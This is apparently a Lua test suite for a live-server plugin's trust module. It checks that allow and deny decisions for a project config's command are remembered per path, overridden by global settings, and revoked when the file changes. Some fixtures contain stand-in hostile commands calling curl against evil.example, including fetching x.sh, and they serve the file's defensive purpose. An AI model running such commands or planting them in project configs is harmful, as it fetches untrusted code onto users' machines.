local t = require("harness")
local trust = require("live_server.trust")
local config = require("live_server.config")

local PATH = "/tmp/live-server-trust-test/.liveserverrc.json"

local function reset()
  trust.revoke()
  config.did_setup = false
  config.setup({})
end

t.describe("trust decisions", function()
  t.it("starts unknown", function()
    reset()
    t.eq(trust.decision(PATH, '{"command":["x"]}'), "unknown")
  end)

  t.it("remembers an allow", function()
    reset()
    local content = '{"command":["npx","vite"]}'
    trust.record(PATH, content, "allow")
    t.eq(trust.decision(PATH, content), "allow")
  end)

  t.it("remembers a deny", function()
    reset()
    local content = '{"command":["curl","evil.example"]}'
    trust.record(PATH, content, "deny")
    t.eq(trust.decision(PATH, content), "deny")
  end)

  t.it("revokes consent when the file changes", function()
    reset()
    trust.record(PATH, '{"command":["npx","vite"]}', "allow")
    t.eq(
      trust.decision(PATH, '{"command":["curl","http://evil.example/x.sh"]}'),
      "unknown",
      "editing a trusted file must require fresh consent"
    )
  end)

  t.it("does not carry consent across paths", function()
    reset()
    local content = '{"command":["npx","vite"]}'
    trust.record(PATH, content, "allow")
    t.eq(trust.decision("/tmp/other-project/.liveserverrc.json", content), "unknown")
  end)

  t.it("honours trust = allow", function()
    reset()
    config.did_setup = false
    config.setup({ project = { trust = "allow" } })
    t.eq(trust.decision(PATH, "anything"), "allow")
    reset()
  end)

  t.it("honours trust = deny", function()
    reset()
    config.did_setup = false
    config.setup({ project = { trust = "deny" } })
    trust.record(PATH, "content", "allow")
    t.eq(trust.decision(PATH, "content"), "deny", "deny mode must override a stored allow")
    reset()
  end)

  t.it("lists and revokes records", function()
    reset()
    trust.record(PATH, "a", "allow")
    trust.record("/tmp/other/.liveserverrc.json", "b", "deny")
    t.eq(#trust.list(), 2)
    t.eq(trust.revoke(PATH), 1)
    t.eq(#trust.list(), 1)
    t.eq(trust.revoke(), 1)
    t.eq(#trust.list(), 0)
  end)
end)

t.describe("trust.ensure", function()
  t.it("passes straight through when nothing is privileged", function()
    reset()
    local granted = nil
    trust.ensure({ config_path = PATH, config_content = "{}", privileged = {} }, function(value)
      granted = value
    end)
    t.eq(granted, true)
  end)

  t.it("passes straight through when there is no project file", function()
    reset()
    local granted = nil
    trust.ensure({ privileged = { command = { "x" } } }, function(value)
      granted = value
    end)
    t.eq(granted, true)
  end)

  t.it("returns the stored decision without prompting", function()
    reset()
    local content = '{"command":["npx","vite"]}'
    trust.record(PATH, content, "allow")
    local granted = nil
    trust.ensure(
      { config_path = PATH, config_content = content, privileged = { command = { "npx", "vite" } } },
      function(value)
        granted = value
      end
    )
    t.eq(granted, true)

    trust.record(PATH, content, "deny")
    trust.ensure(
      { config_path = PATH, config_content = content, privileged = { command = { "npx", "vite" } } },
      function(value)
        granted = value
      end
    )
    t.eq(granted, false)
    reset()
  end)
end)
